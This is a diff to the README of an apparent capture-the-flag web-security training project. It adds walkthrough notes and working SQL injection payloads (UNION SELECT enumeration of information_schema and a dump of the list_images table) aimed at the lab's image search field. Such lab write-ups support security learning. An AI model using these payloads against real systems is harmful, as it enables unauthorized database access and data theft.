@@ -1,6 +1,9 @@
 
 A sort of capture the flag web application security project
 
+Here is a website that gives a taster for hacking (web, networks, kernel):
+https://www.bases-hacking.org/articles-categories.html
+
 
 INSTALLATION
 
@@ -50,14 +53,33 @@ Apply “levels of clearance” as appropriate
 ## SQL IMAGE INJECTION
 
 insert the following commands into the image search bar
+- this is using POST, versus GET which is using the search bar of the browser
 
 # To get the request columns number
 1 OR 1=1 UNION SELECT NULL, NULL--
 > 2 columns
 
+# we type 1 OR 1=1 in the search field and we get all the result because every row
+is considered true.
+
 # To get the images columns names
 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
 > id, url, title, comment
+
+# Table structure :
+
+Table name: list_images
+column : id
+
+Table name: list_images
+column : url
+
+Table name: list_images
+column : title
+
+Table name: list_images
+column : comment
 
 # To see all images's data
 1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
